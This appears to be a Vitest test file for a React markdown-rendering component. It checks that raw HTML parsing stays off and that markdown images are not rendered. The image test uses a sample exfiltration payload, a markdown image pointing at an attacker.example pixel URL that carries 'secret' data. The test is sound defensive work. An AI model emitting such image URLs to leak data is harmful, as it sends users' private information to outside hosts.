import { renderToStaticMarkup } from "react-dom/server";
import type React from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";

type MockStreamdownProps = {
  children?: React.ReactNode;
  components: {
    img: React.ComponentType<React.ImgHTMLAttributes<HTMLImageElement>>;
  };
  rehypePlugins?: unknown[];
};

const streamdownMock = vi.hoisted(() =>
  vi.fn((props: MockStreamdownProps) => props.children),
);

vi.mock("streamdown", () => ({
  Streamdown: streamdownMock,
  defaultRehypePlugins: {
    katex: "katex",
    raw: "raw",
  },
  defaultRemarkPlugins: {
    gfm: "gfm",
    math: "math",
  },
}));

import StreamingMarkdownContent from "./StreamingMarkdownContent";

describe("StreamingMarkdownContent", () => {
  beforeEach(() => {
    streamdownMock.mockClear();
  });

  it("does not enable raw HTML parsing", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="<iframe></iframe>" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    expect(props.rehypePlugins).toEqual(["katex"]);
    expect(props.rehypePlugins).not.toContain("raw");
  });

  it("does not render markdown image src values", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="![secret](https://attacker.example/pixel?data=secret)" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    const Img = props.components.img;
    const html = renderToStaticMarkup(
      <Img alt="secret" src="https://attacker.example/pixel?data=secret" />,
    );

    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("secret");
  });
});
